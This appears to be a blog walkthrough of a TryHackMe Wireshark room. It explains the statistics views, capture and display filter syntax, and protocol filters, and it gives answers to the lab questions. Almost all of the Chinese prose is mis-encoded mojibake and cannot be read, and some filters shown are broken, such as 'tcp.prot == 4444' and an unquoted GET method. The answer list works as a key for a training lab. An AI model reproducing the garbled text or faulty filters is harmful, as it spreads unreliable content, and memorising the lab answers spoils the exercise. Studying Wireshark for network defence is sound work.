<img src="https://i-blog.csdnimg.cn/img_convert/dcad2402ebde2dc784f875de8c8e42be.png" alt="400" loading="lazy"></p>
<pre><code class="language-python">435
</code></pre>
<p>ä»âMicro-StâMACå°åä¼ è¾äºå¤å°å­èï¼kï¼ï¼<br>
æå¼ç«¯ç¹æ¥çå³å¯<br>
<img src="https://i-blog.csdnimg.cn/img_convert/673c9c730bcff1a2e786c25681df9801.png" alt="400" loading="lazy"></p>
<pre><code class="language-python">7474
</code></pre>
<p>ä¸âKansas Cityâå³èç IP å°åæ°éæ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/a594e79bd61d224ffb968a065098dd55.png" alt="400" loading="lazy"></p>
<pre><code class="language-python">4
</code></pre>
<p>ä¸âBlicnetâASç»ç»å³èçIPå°åæ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/c26815ea71db5b2d72dad7ffc9aff17d.png" alt="400" loading="lazy"></p>
<pre><code class="language-python">188.246.82.7
</code></pre>
<h4 id="ç»è®¡æ°æ®--åè®®è¯¦æ">ç»è®¡æ°æ® | åè®®è¯¦æ</h4>
<h5 id="ipv4-å-ipv6">IPv4 å IPv6</h5>
<p>å°ç®åä¸ºæ­¢ï¼å ä¹ææéé¡¹é½æä¾äºåå«ä¸¤ç§IPå°åçæ¬çä¿¡æ¯ãç»è®¡èåæä¾äºä¸¤ä¸ªéé¡¹ï¼ç¨äºç­éåå«ç¹å®IPçæ¬çåç»è®¡ä¿¡æ¯ãå æ­¤ï¼åæäººåå¯ä»¥å¨ä¸ä¸ªçªå£ä¸­è¯å«å¹¶ååºææä¸ç¹å®IPçæ¬å³èçäºä»¶ï¼å¹¶å°å¶ç¨äºæå´è¶£çäºä»¶ãæ¨å¯ä»¥ä½¿ç¨âç»è®¡ä¿¡æ¯ --&gt; IPvXç»è®¡ä¿¡æ¯âèåæ¥çæ­¤ä¿¡æ¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/2921b466c65ade1e6d4b361641c81f1d.png" alt="" loading="lazy"></p>
<h5 id="dns">DNS</h5>
<p>æ­¤éé¡¹ä¼å°æè·æä»¶ä¸­çææDNSæ°æ®åè¿è¡ç»åï¼å¹¶å¸®å©åæäººåæ ¹æ®æ°æ®åè®¡æ°å¨åDNSåè®®ç¾åæ¯ä»¥æ ç¶è§å¾æ¥çåæç»æãå æ­¤ï¼åæäººåå¯ä»¥æ¥çDNSæå¡çæ»ä½ä½¿ç¨æåµï¼åæ¬ rcodeãopcodeãclassãquery typeãæå¡åæ¥è¯¢ç»è®¡ä¿¡æ¯ï¼å¹¶å°å¶ç¨äºæå´è¶£çäºä»¶ãæ¨å¯ä»¥ä½¿ç¨  <strong>âç»è®¡ä¿¡æ¯ --&gt; DNS â</strong> èåæ¥çæ­¤ä¿¡æ¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/253d6c0062debfff69a7f26310dba93c.png" alt="" loading="lazy"></p>
<h5 id="http">HTTP</h5>
<p>æ­¤éé¡¹ä¼å°æè·æä»¶ä¸­çææHTTPæ°æ®åè¿è¡ç»åï¼å¹¶å¸®å©åæäººåæ ¹æ®æ°æ®åè®¡æ°å¨åHTTPåè®®ç¾åæ¯ä»¥æ ç¶è§å¾æ¥çåæç»æãå æ­¤ï¼åæäººåå¯ä»¥æ¥çHTTPæå¡çæ»ä½ä½¿ç¨æåµï¼åæ¬è¯·æ±åååºä»£ç ä»¥ååå§è¯·æ±ãæ¨å¯ä»¥ä½¿ç¨ <strong>âç»è®¡ä¿¡æ¯ --&gt; HTTP â</strong> èåæ¥çæ­¤ä¿¡æ¯ã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/78a7824ba9feab308e8044a4ed5da46e.png" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>æå¸¸ç¨çIPv4ç®æ å°åæ¯ä»ä¹ï¼<br>
æå¼ç®æ å°ååç«¯å£ï¼ç¹å»æåºä¸ä¸å³å¯ç¥éè°çç¾åæ¯å æå¤<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ab9829d4ee447ed6b12ba03e2ca8bd28.png" alt="" loading="lazy"></p>
<pre><code class="language-python">10.100.1.33
</code></pre>
<p>DNSæ°æ®åçæå¤§æå¡è¯·æ±-ååºæ¶é´æ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/bafecf1cc84fb21686177a3c9eca2245.png" alt="" loading="lazy"></p>
<pre><code class="language-python">0.467897
</code></pre>
<p><code>ârad[.]msn[.]comâ</code>å®æäºå¤å°ä¸ªHTTPè¯·æ±ï¼<br>
ç¹å¼dnsçç»è®¡ï¼ç¶åæ¾å°è¯¥ååï¼å¾å³è¾¹å<br>
<img src="https://i-blog.csdnimg.cn/img_convert/6002ad8eec336d34a52c8b997b0f0c04.png" alt="" loading="lazy"><br>
å°±è½çå°è®¡æ°äº<br>
<img src="https://i-blog.csdnimg.cn/img_convert/6c18cef0d7d354abda670dd76db049ce.png" alt="" loading="lazy"></p>
<pre><code class="language-python">39
</code></pre>
<h4 id="æ°æ®åè¿æ»¤--åç">æ°æ®åè¿æ»¤ | åç</h4>
<p>å¨ä¸ä¸èè¯¾ï¼<a href="https://tryhackme.com/room/wiresharkthebasics" target="_blank" rel="noopener nofollow">Wiresharkï¼åºç¡ç¯</a>ï¼ä¸­ï¼æä»¬è®²è§£äºæ°æ®åè¿æ»¤ä»¥åå¦ä½å¨ä¸ä½¿ç¨æ¥è¯¢çæåµä¸è¿æ»¤æ°æ®åãæ¬èè¯¾æä»¬å°ä½¿ç¨æ¥è¯¢æ¥è¿æ»¤æ°æ®åãå¦åæè¿°ï¼Wireshark ä¸­æä¸¤ç§ç±»åçè¿æ»¤å¨ãè½ç¶å®ä»¬çè¯­æ³ç¸ä¼¼ï¼ä½ç¨éä¸åãè®©æä»¬åé¡¾ä¸ä¸è¿ä¸¤ç§è¿æ»¤å¨çåºå«ã</p>
<table>
<thead>
<tr>
<th><strong>æè·è¿æ»¤å¨</strong></th>
<th>è¿ç§ç±»åçè¿æ»¤å¨ç¨äºä»ä¿å­æµéçç¹å®é¨åãå®å¨æè·æµéä¹åè®¾ç½®ï¼å¹¶ä¸å¨æè·è¿ç¨ä¸­æ æ³æ´æ¹ã</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>æ¾ç¤ºç­éå¨</strong></td>
<td>è¿ç§ç±»åçè¿æ»¤å¨ç¨äºéè¿åå°å¯è§æ°æ®åçæ°éæ¥è°æ¥æ°æ®åï¼å¹¶ä¸å¨æè·è¿ç¨ä¸­å¯ä»¥æ´æ¹ã</td>
</tr>
</tbody>
</table>
<p><strong>æ³¨æï¼</strong> æ¨ä¸è½ä½¿ç¨æ¾ç¤ºç­éè¡¨è¾¾å¼æ¥æè·æµéï¼åä¹äº¦ç¶ã</p>
<p>å¸åçä½¿ç¨åºæ¯æ¯æè·æææ°æ®åï¼ç¶åæ ¹æ®æå´è¶£çäºä»¶è¿è¡è¿æ»¤ãåªæç»éªä¸°å¯çä¸ä¸äººåæä¼ä½¿ç¨æè·è¿æ»¤å¨å¹¶åæ¢æµéãè¿å°±æ¯ä¸ºä»ä¹ Wireshark å¨æ¾ç¤ºè¿æ»¤å¨ä¸­æ¯ææ´å¤åè®®ç±»åçåå ãè¯·å¡å¿å¨å®éç¯å¢ä¸­ä½¿ç¨æè·è¿æ»¤å¨ä¹åï¼å½»åºäºè§£å¦ä½ä½¿ç¨å®ä»¬ãè®°ä½ï¼å¦ææ¨çæè·è¿æ»¤å¨ä¸æ¨è¦æ¥æ¾çç¹å®æµéæ¨¡å¼ä¸å¹éï¼æ¨å°æ æ³æè·å°æå´è¶£çäºä»¶ã</p>
<h5 id="æè·è¿æ»¤å¨è¯­æ³">æè·è¿æ»¤å¨è¯­æ³</h5>
<p>è¿äºè¿æ»¤å¨ä½¿ç¨å­èåç§»éãåå­è¿å¶å¼åæ©ç ä»¥åå¸å°è¿ç®ç¬¦ï¼å æ­¤ä¹ä¸çå¹¶ä¸å®¹æçè§£/é¢æµå¶ç¨éãåºæ¬è¯­æ³è§£éå¦ä¸ï¼</p>
<ul>
<li><strong>Scopeä½ç¨åï¼</strong> ä¸»æºãç½ç»ãç«¯å£åç«¯å£èå´ã</li>
<li><strong>Directionæ¹åï¼</strong> æºãç®æ ãæºæç®æ ãæºåç®æ ï¼</li>
<li><strong>Protocolåè®®ï¼</strong> ä»¥å¤ªç½ãWLANãIPãIP6ãARPãRARPãTCPåUDPã</li>
<li><strong>ç¨äºæè·ç«¯å£ 80 æµéçç¤ºä¾è¿æ»¤å¨ï¼</strong> <code>tcp port 80</code></li>
</ul>
<p>æ¨å¯ä»¥ç¹å» <a href="https://www.wireshark.org/docs/man-pages/pcap-filter.html" target="_blank" rel="noopener nofollow">æ­¤å¤ï¼https://www.wireshark.org/docs/man-pages/pcap-filter.html</a> å <a href="https://gitlab.com/wireshark/wireshark/-/wikis/CaptureFilters#useful-filters" target="_blank" rel="noopener nofollow">æ­¤å¤ï¼https://gitlab.com/wireshark/wireshark/-/wikis/CaptureFilters#useful-filters</a>éè¯»æ´å¤å³äºæè·è¿æ»¤å¨è¯­æ³çä¿¡æ¯ãå¿«éåèæåä½äº <strong>âæè· --&gt; æè·è¿æ»¤å¨â</strong> èåä¸ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/5110f7ffdc7c2286e38913f9d83bde0b.png" alt="" loading="lazy"></p>
<h5 id="æ¾ç¤ºç­éè¯­æ³">æ¾ç¤ºç­éè¯­æ³</h5>
<p>è¿æ¯ Wireshark æå¼ºå¤§çåè½ãå®æ¯æ 3000 ç§åè®®ï¼å¹¶åè®¸å¨åè®®åç±»ä¸è¿è¡æ°æ®åçº§å«çæç´¢ãå®æ¹çâ<a href="https://www.wireshark.org/docs/dfref/" target="_blank" rel="noopener nofollow">æ¾ç¤ºè¿æ»¤å¨åèï¼https://www.wireshark.org/docs/dfref/</a>âæä¾äºææåæ¯æçåè®®åç±»ï¼æ¹ä¾¿è¿è¡è¿æ»¤ã</p>
<ul>
<li><strong>ç¨äºæè·ç«¯å£ 80 æµéçç¤ºä¾è¿æ»¤å¨ï¼</strong> <code>tcp.port == 80</code></li>
</ul>
<p>Wireshark åç½®äºä¸ä¸ªéé¡¹ï¼æ¾ç¤ºè¿æ»¤å¨è¡¨è¾¾å¼ï¼ï¼ç¨äºå­å¨ææåæ¯æçåè®®ç»æï¼ä»¥å¸®å©åæäººååå»ºæ¾ç¤ºè¿æ»¤å¨ãæä»¬ç¨åä¼ä»ç»âæ¾ç¤ºè¿æ»¤å¨è¡¨è¾¾å¼âèåãç°å¨ï¼è®©æä»¬æ¥äºè§£ä¸ä¸æ¾ç¤ºè¿æ»¤å¨æä½çåºæ¬åçãæ¨å¯ä»¥å¨ <strong>âåæ --&gt; æ¾ç¤ºè¿æ»¤å¨â</strong> èåä¸æ¾å°å¿«éåèã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ca347cd1f0ef0b9067df1dc2ce47f92a.png" alt="" loading="lazy"></p>
<h5 id="æ¯è¾è¿ç®ç¬¦">æ¯è¾è¿ç®ç¬¦</h5>
<p>æ¨å¯ä»¥ä½¿ç¨ä¸åçæ¯è¾è¿ç®ç¬¦åå»ºæ¾ç¤ºç­éå¨ï¼ä»¥æ¥æ¾æå´è¶£çäºä»¶ãä¸»è¦è¿ç®ç¬¦å¦ä¸è¡¨æç¤ºã</p>
<table>
<thead>
<tr>
<th><strong>è±è¯­</strong></th>
<th><strong>C ç±»</strong></th>
<th><strong>æè¿°</strong></th>
<th><strong>ä¾å­</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>æ¹ç¨</td>
<td>==</td>
<td>å¹³ç­ç</td>
<td><code>ip.src == 10.10.10.100</code></td>
</tr>
<tr>
<td>ne</td>
<td>!=</td>
<td>ä¸ç­äº</td>
<td><code>ip.src != 10.10.10.100</code></td>
</tr>
<tr>
<td>gt</td>
<td>&gt;</td>
<td>å¤§äº</td>
<td><code>ip.ttl &gt; 250</code></td>
</tr>
<tr>
<td>lt</td>
<td>&lt;</td>
<td>å°äº</td>
<td><code>ip.ttl &lt; 10</code></td>
</tr>
<tr>
<td>ge</td>
<td>&gt;=</td>
<td>å¤§äºæç­äº</td>
<td><code>ip.ttl &gt;= 0xFA</code></td>
</tr>
<tr>
<td>å</td>
<td>&lt;=</td>
<td>å°äºæç­äº</td>
<td><code>ip.ttl &lt;= 0xA</code></td>
</tr>
</tbody>
</table>
<p><strong>æ³¨æï¼</strong>  Wireshark æ¯æä½¿ç¨åè¿å¶ååå­è¿å¶å¼è¿è¡è¿æ»¤ãæ¨å¯ä»¥æ ¹æ®æç´¢éè¦ä½¿ç¨ä»»ä½æ ¼å¼ã</p>
<h5 id="é»è¾è¡¨è¾¾å¼">é»è¾è¡¨è¾¾å¼</h5>
<p>Wireshark æ¯æå¸å°è¯­æ³ãæ¨ä¹å¯ä»¥ä½¿ç¨é»è¾è¿ç®ç¬¦åå»ºæ¾ç¤ºè¿æ»¤å¨ã</p>
<table>
<thead>
<tr>
<th><strong>è±è¯­</strong></th>
<th><strong>C ç±»</strong></th>
<th><strong>æè¿°</strong></th>
<th><strong>ä¾å­</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å</td>
<td>&amp;&amp;</td>
<td>é»è¾å</td>
<td><code>(ip.src == 10.10.10.100) AND (ip.src == 10.10.10.111)</code></td>
</tr>
<tr>
<td>æè</td>
<td>||</td>
<td>é»è¾æ</td>
<td><code>(ip.src == 10.10.10.100) OR (ip.src == 10.10.10.111)</code></td>
</tr>
<tr>
<td>ä¸æ¯</td>
<td>!</td>
<td>é»è¾é</td>
<td><code>!(ip.src == 10.10.10.222)</code><br><br><strong>æ³¨æï¼</strong>å·²å¼ç¨ æ­¤ç¨æ³<code>!=value</code> ï¼ä½¿ç¨å®å¯è½ä¼å¯¼è´ç»æä¸ä¸è´ã<code>!(value)</code> å»ºè®®ä½¿ç¨å¦ä¸ç§æ ·å¼ä»¥è·å¾æ´ä¸è´çç»æã</td>
</tr>
</tbody>
</table>
<h5 id="æ°æ®åè¿æ»¤å·¥å·æ ">æ°æ®åè¿æ»¤å·¥å·æ </h5>
<p>ç­éå·¥å·æ ç¨äºåå»ºååºç¨æ¾ç¤ºç­éå¨ãå®æ¯ä¸ä¸ªæºè½å·¥å·æ ï¼å¯å¸®å©æ¨è½»æ¾åå»ºææçæ¾ç¤ºç­éå¨ãå¨å¼å§ç­éæ°æ®åä¹åï¼ä»¥ä¸æ¯ä¸äºæç¤ºï¼</p>
<ul>
<li>æ°æ®åè¿æ»¤å¨ä»¥å°åå­æ¯å®ä¹ã</li>
<li>æ°æ®åè¿æ»¤å¨å·æèªå¨å®æåè½ï¼å¯ä»¥åè§£åè®®ç»èï¼æ¯ä¸ªç»èé½ç¨ä¸ä¸ªâç¹âè¡¨ç¤ºã</li>
<li>æ°æ®åè¿æ»¤å¨éç¨ä¸è²è¡¨ç¤ºæ³ï¼å·ä½è¯´æå¦ä¸ã</li>
</ul>
<table>
<thead>
<tr>
<th><strong>ç»¿è²ç</strong></th>
<th>ææç­éå¨</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>çº¢è²ç</strong></td>
<td>æ æç­éå¨</td>
</tr>
<tr>
<td><strong>é»è²ç</strong></td>
<td>è­¦åï¼æ­¤è¿æ»¤å¨è½ç¶å¯ç¨ï¼ä½å¹¶ä¸ç¨³å®ï¼å»ºè®®æ´æ¢ä¸ºææçè¿æ»¤å¨ã</td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081244407-1613664507.png" alt="" loading="lazy"></td>
<td></td>
</tr>
<tr>
<td>ç­éå·¥å·æ åè½å¦ä¸æç¤ºã</td>
<td></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081243969-1961969544.png" alt="" loading="lazy"></td>
<td></td>
</tr>
<tr>
<td>æä»¬å·²ç»å­¦ä¹ äºå¾å¤åçåè¯­æ³ãæ¥ä¸æ¥ï¼è®©æä»¬å°è¿äºç¥è¯ä»è¯¸å®è·µï¼å¼å§å¨ä¸ä¸ä¸ªä»»å¡ä¸­è¿æ»¤æ°æ®åã</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="æ°æ®åè¿æ»¤--åè®®è¿æ»¤å¨">æ°æ®åè¿æ»¤ | åè®®è¿æ»¤å¨</h4>
<p>å¦åææè¿°ï¼Wireshark æ¯æ 3000 ç§åè®®ï¼å¹¶åè®¸éè¿è¿æ»¤åè®®å­æ®µè¿è¡æ°æ®åçº§å«çåæãæ¬ä»»å¡å°æ¼ç¤ºå¦ä½åå»ºåä½¿ç¨éå¯¹ä¸ååè®®å­æ®µçè¿æ»¤å¨ã</p>
<h5 id="ipè¿æ»¤å¨">IPè¿æ»¤å¨</h5>
<p>IPè¿æ»¤å¨å¸®å©åæäººåæ ¹æ®æ°æ®åä¸­çIPå±ä¿¡æ¯ï¼OSIæ¨¡åçç½ç»å±ï¼è¿æ»¤æµéãè¿æ¯Wiresharkä¸­æå¸¸ç¨çè¿æ»¤å¨ä¹ä¸ãè¿äºè¿æ»¤å¨ä¼è¿æ»¤ç½ç»å±ä¿¡æ¯ï¼ä¾å¦IPå°åãçæ¬ãçå­æ¶é´ãæå¡ç±»åãæ å¿ä½åæ ¡éªåå¼ã</p>
<p>å¸¸ç¨ç­éæ¡ä»¶å¦ä¸è¡¨æç¤ºã</p>
<table>
<thead>
<tr>
<th>ç­é</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ip</code></td>
<td>æ¾ç¤ºææIPæ°æ®åã</td>
</tr>
<tr>
<td><code>ip.addr == 10.10.10.111</code></td>
<td>æ¾ç¤ºææåå« IP å°å 10.10.10.111 çæ°æ®åã</td>
</tr>
<tr>
<td><code>ip.addr == 10.10.10.0/24</code></td>
<td>æ¾ç¤ºææåå«æ¥èª 10.10.10.0/24 å­ç½ç IP å°åçæ°æ®åã</td>
</tr>
<tr>
<td><code>ip.src == 10.10.10.111</code></td>
<td>æ¾ç¤ºæææºèª 10.10.10.111 çæ°æ®å</td>
</tr>
<tr>
<td><code>ip.dst == 10.10.10.111</code></td>
<td>æ¾ç¤ºåéå° 10.10.10.111 çæææ°æ®å</td>
</tr>
<tr>
<td>ip.addr <strong>ä¸</strong> ip.src/ip.dst</td>
<td><strong>æ³¨æï¼</strong>  ip.addr è¿æ»¤æµéæ¶ä¸èèæ°æ®åæ¹åãip.src/ip.dst åæ ¹æ®æ°æ®åæ¹åè¿è¡è¿æ»¤ã</td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081243335-182061779.gif" alt="" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="tcp-å-udp-è¿æ»¤å¨">TCP å UDP è¿æ»¤å¨</h5>
<p>TCPè¿æ»¤å¨å¸®å©åæäººåæ ¹æ®æ°æ®åä¸­çåè®®å±ä¿¡æ¯ï¼OSIæ¨¡åçä¼ è¾å±ï¼è¿æ»¤æµéãè¿äºè¿æ»¤å¨ä¼è¿æ»¤ä¼ è¾åè®®å±çä¿¡æ¯ï¼ä¾å¦æºç«¯å£åç®æ ç«¯å£ãåºåå·ãç¡®è®¤å·ãçªå£å¤§å°ãæ¶é´æ³ãæ å¿ãé¿åº¦ååè®®éè¯¯ã</p>
<table>
<thead>
<tr>
<th>ç­é</th>
<th>æè¿°</th>
<th>ç­é</th>
<th>è¡¨è¾¾</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>tcp.port == 80</code></td>
<td>æ¾ç¤ºææç«¯å£ä¸º 80 ç TCPæ°æ®å</td>
<td><code>udp.port == 53</code></td>
<td>æ¾ç¤ºææç«¯å£ä¸º 53 çUDPæ°æ®å</td>
</tr>
<tr>
<td><code>tcp.srcport == 1234</code></td>
<td>æ¾ç¤ºæææºèªç«¯å£ 1234 çTCPæ°æ®å</td>
<td><code>udp.srcport == 1234</code></td>
<td>æ¾ç¤ºæææºèªç«¯å£ 1234 çUDPæ°æ®å</td>
</tr>
<tr>
<td><code>tcp.dstport == 80</code></td>
<td>æ¾ç¤ºåéå°ç«¯å£ 80 çææTCPæ°æ®å</td>
<td><code>udp.dstport == 5353</code></td>
<td>æ¾ç¤ºåéå°ç«¯å£ 5353 çææUDPæ°æ®å</td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081242082-492307879.gif" alt="" loading="lazy"></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="åºç¨å±åè®®è¿æ»¤å¨--http-å-dns">åºç¨å±åè®®è¿æ»¤å¨ | HTTP å DNS</h5>
<p>åºç¨å±åè®®è¿æ»¤å¨å¸®å©åæäººåæ ¹æ®æ°æ®åä¸­çåºç¨å±åè®®ä¿¡æ¯ï¼OSI æ¨¡åçåºç¨å±ï¼è¿æ»¤æµéãè¿äºè¿æ»¤å¨æ ¹æ®åè®®ç±»åè¿æ»¤ç¹å®äºåºç¨å±çä¿¡æ¯ï¼ä¾å¦ææè½½è·åé¾è·¯æ°æ®ã</p>
<table>
<thead>
<tr>
<th>ç­é</th>
<th>æè¿°</th>
<th>ç­é</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>http</code></td>
<td>æ¾ç¤ºææHTTPæ°æ®å</td>
<td><code>dns</code></td>
<td>æ¾ç¤ºææDNSæ°æ®å</td>
</tr>
<tr>
<td><code>http.response.code == 200</code></td>
<td>æ¾ç¤ºææHTTPååºä»£ç ä¸ºâ200âçæ°æ®å</td>
<td><code>dns.flags.response == 0</code></td>
<td>æ¾ç¤ºææDNSè¯·æ±</td>
</tr>
<tr>
<td><code>http.request.method == "GET"</code></td>
<td>æ¾ç¤ºææHTTP GET è¯·æ±</td>
<td><code>dns.flags.response == 1</code></td>
<td>æ¾ç¤ºææDNSååº</td>
</tr>
<tr>
<td><code>http.request.method == "POST"</code></td>
<td>æ¾ç¤ºææHTTP POST è¯·æ±</td>
<td><code>dns.qry.type == 1</code></td>
<td>æ¾ç¤ºææDNS âAâè®°å½</td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081240576-1614070248.gif" alt="" loading="lazy"></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="æ¾ç¤ºç­éè¡¨è¾¾å¼">æ¾ç¤ºç­éè¡¨è¾¾å¼</h5>
<p>å¦åæè¿°ï¼Wireshark åç½®äºä¸ä¸ªéé¡¹ï¼æ¾ç¤ºè¿æ»¤å¨è¡¨è¾¾å¼ï¼ï¼å¶ä¸­å­å¨äºææåæ¯æçåè®®ç»æï¼ä»¥å¸®å©åæäººååå»ºæ¾ç¤ºè¿æ»¤å¨ãå½åæäººåè®°ä¸æ¸ç¹å®åè®®æéçè¿æ»¤å¨ï¼æèä¸ç¡®å®è¿æ»¤å¨çå¯èµå¼æ¶ï¼âæ¾ç¤ºè¿æ»¤å¨è¡¨è¾¾å¼âèåæä¾äºä¸ä¸ªæäºä½¿ç¨çæ¾ç¤ºè¿æ»¤å¨æå»ºæåãè¯¥ èåä½äº <strong>âåæ --&gt; æ¾ç¤ºè¿æ»¤å¨è¡¨è¾¾å¼â</strong> ä¸ ã</p>
<p>è¦è®°ä½æ¯ç§åè®®çæææ¾ç¤ºè¿æ»¤å¨ç»èæ¯ä¸å¯è½çãæ¯ç§åè®®é½å¯è½åå«ä¸åçå­æ®µï¼å¹¶æ¥ååç§ç±»åçå¼ã<strong>âæ¾ç¤ºè¿æ»¤å¨è¡¨è¾¾å¼â</strong> èåä¼æ¾ç¤ºææåè®®å­æ®µãæ¥åçå¼ç±»åï¼æ´æ°æå­ç¬¦ä¸²ï¼ä»¥åé¢å®ä¹å¼ï¼å¦æï¼ãè¯·æ³¨æï¼ææ¡åå»ºè¿æ»¤å¨åå­¦ä¹ åè®®è¿æ»¤å¨å­æ®µéè¦æ¶é´åç»ä¹ ã<br>
è¿ç§å°±æ¯å¨ä½ ä¸ç¥éæä¹åè¯­æ³è¿æ»¤çæ¶åæéæ©è¿ç§æ¹å¼ï¼æ¾åè®®ï¼ç¶åè¿æ»¤ï¼æä»¥è¯´æä¼å«ä½ è¥ä¸æ³ç¨è¿ç§æ¹å¼å°±éè¦ä½ å¤§éç»ä¹ ï¼äºè§£è¯­æ³<br>
<img src="https://i-blog.csdnimg.cn/img_convert/e88542e44c707050fbf654d9d62ed9eb.png" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>IPæ°æ®åçæ°éæ¯å¤å°ï¼<br>
ç­éipå³å¯<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ba26bbc8d015bdd7fc159a74c62b3127.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">81420
</code></pre>
<p>TTL å¼å°äº 10 çæ°æ®åæ°éæ¯å¤å°ï¼<br>
ç­éï¼<code>ip.ttl &lt; 10</code></p>
<pre><code class="language-python">66
</code></pre>
<p>ä½¿ç¨âTCPç«¯å£4444âçæ°æ®åæ°éæ¯å¤å°ï¼<br>
ç­éï¼<code>tcp.prot == 4444</code></p>
<pre><code class="language-python">632
</code></pre>
<p>åéå°ç«¯å£â80âçâHTTP GETâè¯·æ±æ°éæ¯å¤å°ï¼<br>
ç­éï¼<code>tcp.port == 80 and http.request.method == GET</code><br>
æ³¨æï¼è¿ä¸ªGETä¸å®è¦å¤§åï¼å°åè¯è¿äºï¼ä¸è¡</p>
<pre><code class="language-python">527
</code></pre>
<p>Aç±»DNSæ¥è¯¢çæ°éæ¯å¤å°ï¼<br>
ç­éï¼<code>dns.a</code></p>
<pre><code class="language-python">51
</code></pre>
<h4 id="é«çº§ç­é">é«çº§ç­é</h4>
<p>å°ç®åä¸ºæ­¢ï¼æ¨å·²ç»å­¦ä¹ äºæ°æ®åè¿æ»¤æä½çåºç¡ç¥è¯ãç°å¨æ¯æ¶åå³æ³¨ç¹å®äºä»¶çæ°æ®åç»èäºãé¤äºä¸ä¸èè¯¾ä»ç»çè¿ç®ç¬¦åè¡¨è¾¾å¼ä¹å¤ï¼Wireshark è¿æä¾äºé«çº§è¿ç®ç¬¦åå½æ°ãè¿äºé«çº§è¿æ»¤éé¡¹å¯ä»¥å¸®å©åæäººåå¯¹æå´è¶£çäºä»¶è¿è¡æ·±å¥åæã</p>
<h5 id="ç­éæ¡ä»¶åå«">ç­éæ¡ä»¶ï¼âåå«â</h5>
<table>
<thead>
<tr>
<th>ç­é</th>
<th><strong>åå«</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>ç±»å</strong></td>
<td>æ¯è¾ç®å­</td>
</tr>
<tr>
<td><strong>æè¿°</strong></td>
<td>å¨æ°æ®åä¸­æç´¢å¼ãå®åºåå¤§å°åï¼å¹¶éè¿èç¦äºç¹å®å­æ®µæä¾ç±»ä¼¼äºâæ¥æ¾âéé¡¹çåè½ã</td>
</tr>
<tr>
<td><strong>ä¾å­</strong></td>
<td>æ¥æ¾ææâ Apache âæå¡å¨ã</td>
</tr>
<tr>
<td><strong>å·¥ä½æµç¨</strong></td>
<td>ååºææHTTPæ°æ®åï¼å¶ä¸­æ°æ®åçâserverâå­æ®µåå«â Apache âå³é®å­ã</td>
</tr>
<tr>
<td><strong>ç¨æ³</strong></td>
<td><code>http.server contains "Apache"</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081239180-1960349052.png" alt="600" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="ç­éæ¡ä»¶å¹é">ç­éæ¡ä»¶ï¼âå¹éâ</h5>
<table>
<thead>
<tr>
<th>ç­é</th>
<th><strong>æ¯èµ</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ç±»å</td>
<td>æ¯è¾ç®å­</td>
</tr>
<tr>
<td>æè¿°</td>
<td>æç´¢ç¬¦åæ­£åè¡¨è¾¾å¼æ¨¡å¼çåå®¹ãæç´¢ä¸åºåå¤§å°åï¼ä½å¤ææ¥è¯¢å­å¨ä¸å®çè¯¯å·®èå´ã</td>
</tr>
<tr>
<td><strong>ä¾å­</strong></td>
<td>æ¥æ¾ææ .php å .html é¡µé¢ã</td>
</tr>
<tr>
<td>å·¥ä½æµç¨</td>
<td>ååºææ  HTTP æ°æ®åï¼å¶ä¸­æ°æ®åçâhostâå­æ®µä¸å³é®å­â.phpâæâ.htmlâå¹éã</td>
</tr>
<tr>
<td><strong>ç¨æ³</strong></td>
<td><code>http.host matches "\.(php|html)"</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081238675-1715347653.png" alt="600" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="ç­éæ¡ä»¶in">ç­éæ¡ä»¶ï¼âinâ</h5>
<table>
<thead>
<tr>
<th>ç­é</th>
<th><strong>å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ç±»å</td>
<td>æåèµæ ¼</td>
</tr>
<tr>
<td>æè¿°</td>
<td>å¨ç¹å®èå´/èå´åæç´¢å¼æå­æ®µã</td>
</tr>
<tr>
<td>ä¾å­</td>
<td>æ¥æ¾ææä½¿ç¨ç«¯å£ 80ã443 æ 8080 çæ°æ®åã</td>
</tr>
<tr>
<td>å·¥ä½æµç¨</td>
<td>ååºææ TCP æ°æ®åï¼å¶ä¸­æ°æ®åçâç«¯å£âå­æ®µçå¼ä¸º 80ã443 æ 8080ã</td>
</tr>
<tr>
